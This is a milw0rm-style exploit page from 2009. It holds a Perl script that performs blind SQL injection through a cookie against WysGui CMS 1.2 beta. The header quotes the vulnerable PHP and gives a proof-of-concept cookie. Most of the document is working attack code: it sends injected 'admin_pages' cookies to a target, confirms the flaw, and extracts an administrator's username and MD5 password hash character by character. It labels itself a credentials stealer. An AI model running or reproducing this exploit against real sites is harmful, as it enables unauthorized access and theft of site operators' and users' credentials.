<html><head><title>WysGui CMS 1.2b (Insecure Cookie Handling) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	 (Insecure cookie handling) BLIND SQL INJECTION		              |
#|--------------------------------------------------------------------------------------------|
#|                         	    | WysGui CMS 1.2 BETA |		 	              |
#|  CMS INFORMATION:		     ---------------------				      |
#|										              |
#|--&gt;WEB: http://wysgui.com/					   		              |
#|--&gt;DOWNLOAD: http://sourceforge.net/projects/wysgui/		   		              |
#|--&gt;DEMO: http://wysgui.com/demo/							      |
#|--&gt;CATEGORY: CMS / Portals								      |
#|--&gt;DESCRIPTION: WysGui comes from two technical words: WYSIWYG and GUI.WYSIWYG,             |
#| 		(pronounced, Wizzy-Wig),tands for What You See Is What You Get...	      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3                                				      |
#|--&gt;DORK: N/A										      |
#|--&gt;CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
#|--&gt;AFFECT VERSION: LAST = 1.2 BETA (Maybe &lt;= ?)					      |
#|--&gt;Discovered Bug date: 2009-04-20							      |
#|--&gt;Reported Bug date: 2009-04-20							      |
#|--&gt;Fixed bug date: Not fixed								      |
#|--&gt;Info patch (????): Not fixed							      |   
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunailla, padres (y amigos xD) por su apoyo.      |
#----------------------------------------------------------------------------------------------
#
#-----------
#BUG FILE:
#-----------
#
#Path --&gt; [HOME_PATH]/modules/body_mods/admin_panel/settings.php
#
#It contents(¿?...LooooL)
#
#&lt;?php
#//loading data for site tree.
#if(strlen($_COOKIE['admin_pages']))
#{
#	$admin_pages = explode(',',$_COOKIE['admin_pages']);	&lt;--------VULN--------|
#}
#else
#{
#	$admin_pages = array(
#			'addPage', 
#			'Edit Page', 
#			'Delete Page', 
#			  ...);
#}
#?&gt;
#
#Then...
#
#Path --&gt; [HOME_PATH]/modules/body_mods/admin_panel/settings.php
#
#It contents:
#				...
#				
#				if( $i&gt;1 ){
#					$order.= ' `page` = &quot;'.$admin_pages[$i].'&quot;,';	
#				}
#				...			
#
#				$allPages_select = 'SELECT * FROM `pagedata` 
#				WHERE '.$where.'								&lt;--------VULN--------|
#				ORDER BY  '.$order;
#				$allPages_query = mysql_query($allPages_select) or die($allPages_select);
#				while($allPages_row = mysql_fetch_array($allPages_query))
#				{...}
#------------
#CONDITIONS:
#------------
#
#**gpc_magic_quotes=off
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#COOKIE --&gt; admin_pages=about&quot; AND 1=1 /*
#
#Return: about.php
#
#*******************************************************************
# ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
#*******************************************************************
#-------------------------------------------------------------------
#*******************************************************************
# GREETZ TO: JosS and all SPANISH Hack3Rs community!
#*******************************************************************
#
#-------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title WysGui CMS 1.2 BETA (Insecure Cookie Handling) BLIND SQL Injection Exploit&quot;);
		system (&quot;color 02&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(GET =&gt; $_[1]);
	$request-&gt;header(cookie =&gt; $_[0]);
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub helper {
	print &quot;\n\t[XxX] WysGui CMS 1.2 BETA - BLIND SQL Injection Exploit\n&quot;;
	print &quot;\t[XxX] USAGE MODE: [XxX]\n&quot;;
	print &quot;\t[XxX] perl $0 [HOST] [PATH] [id]\n&quot;;
	print &quot;\t[XxX] [HOST]: Web.\n&quot;;
	print &quot;\t[XxX] [PATH]: Home Path.\n&quot;;
	print &quot;\t[XxX] [id]: Id user. Default: 1 (**optional)\n&quot;;
	print &quot;\t[XxX] Example: perl $0 'www.example.es' 'wysgui_1.2' '1'\n&quot;; 
}
sub lengthuser{
#First, user length...
$exit=0;
$i=0;
while($exit==0){
my $insec_cookie='admin_pages=about&quot; AND (SELECT length(user) from users WHERE ID='.$_[1].')='.$i++.' /*';
$output=&amp;request($insec_cookie,$_[0]);
if ( $output =~ (/about.ico/))
{
$exit=1;
}
}

#Save column length
$lengthuser=$i-1;
print &quot;\t-----------------------------------------------------------------\n&quot;;
print &quot;\tUser Length catched!\n&quot;;
print &quot;\tUser Length: &quot;.$lengthuser.&quot;\n&quot;;
print &quot;\tBruteforcing values...\n&quot;;
print &quot;\t-----------------------------------------------------------------\n&quot;;
return $lengthuser;
}
sub bruteforcing {
#Getting datas
$j=1;
	$i=48;
	while(($j&lt;=$_[2]) &amp;&amp; ($i&lt;=126)){
		my $insec_cookie='admin_pages=about&quot; AND ascii(substring((SELECT '.$_[3].' FROM users WHERE ID='.$_[1].') FROM '.$j.' FOR 1))='.$i.' /*';
		$output=&amp;request($insec_cookie,$_[0]);
		if ( $output =~ (/about.ico/))
		{
			$values=$values.chr($i);
			$j++;
			$i=47;
		}
	if($i==57)
	{
		$i=96;
	}
#new char
	$i++; 
	}
#Error
	if(($i&gt;127) || ($j&gt;$_[2])){
		if(!$values){
			print &quot;\t-----------------------------------------------------------------\n&quot;;
			print &quot;\tEXPLOIT FAILED!\n&quot;;
			print &quot;\tFatal error: Datas doesn't find!\n&quot;;
			print &quot;\tCause: Maybe you have to include more characters on bruteforcing...\n&quot;;
			print &quot;\t-----------------------------------------------------------------\n&quot;;
			exit(1);
		}
	}
	
return $values;
}
#Main
&amp;lw;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t##  WysGui CMS 1.2 BETA - BLIND SQL Injection Exploit  ##\n\n&quot;;
	print &quot;\t\t##         ++Conditions: Need magic_quotes=off         ##\n\n&quot;;
	print &quot;\t\t##                    Author: Y3nh4ck3r                ##\n\n&quot;;
	print &quot;\t\t##            Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n&quot;;
	print &quot;\t\t##                    Proud to be Spanish!             ##\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];
#Build the uri
	my $finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/admin.php&quot;;
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=1) 
	{
		&amp;helper;
		exit(1);	
	}
#Id-user is optional.Default:1
	if(!$ARGV[2]){
		$idhacked=&quot;1&quot;;	
	}else{
		$idhacked=$ARGV[2];	
	}
#Testing blind sql injection
my $finalrequest = $finalhost;	
#Test blind sql injection
my $insec_cookie='admin_pages=about&quot; AND 1=1 /*'; #injected cookie
$output=&amp;request($insec_cookie,$finalrequest);
if ( $output =~ (/about.ico/))
{    
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWeb is vulnerable!\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tChecking id user...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}else{ 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tThis Web is not vulnerable!\n&quot;;
	print &quot;\tMaybe patched or gpc_magic_quotes=off\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
exit(1); 
}	
#Test if user exists
my $insec_cookie='admin_pages=about&quot; AND (SELECT COUNT(*) from users WHERE ID='.$idhacked.') /*'; #injected cookie
$output=&amp;request($insec_cookie,$finalrequest);
if ( $output =~ (/about.ico/))
{    
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tOK...The user exists!\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWait several minutes...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}else{ 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tUser doesn't exists!\n&quot;;		
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
exit(1); }	
#Bruteforcing user...
$length_user=&amp;lengthuser($finalrequest,$idhacked);
$user=&amp;bruteforcing($finalrequest,$idhacked,$length_user,'user');
print &quot;\t-----------------------------------------------------------------\n&quot;;
print &quot;\tGot user!\n&quot;;
print &quot;\tBruteforcing password hash (md5)...\n&quot;;
print &quot;\t-----------------------------------------------------------------\n&quot;;
$passhash=&amp;bruteforcing($finalrequest,$idhacked,32,'pass'); #it isn't needed length
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t****  EXPLOIT EXECUTED (CREDENTIALS STEALER) ****\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tUser-id:&quot;.$idhacked.&quot;\n&quot;;
print &quot;\t\tUser:&quot;.$user.&quot;\n&quot;;
print &quot;\t\tUser-password(hash):&quot;.$passhash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-04-20]</pre></html>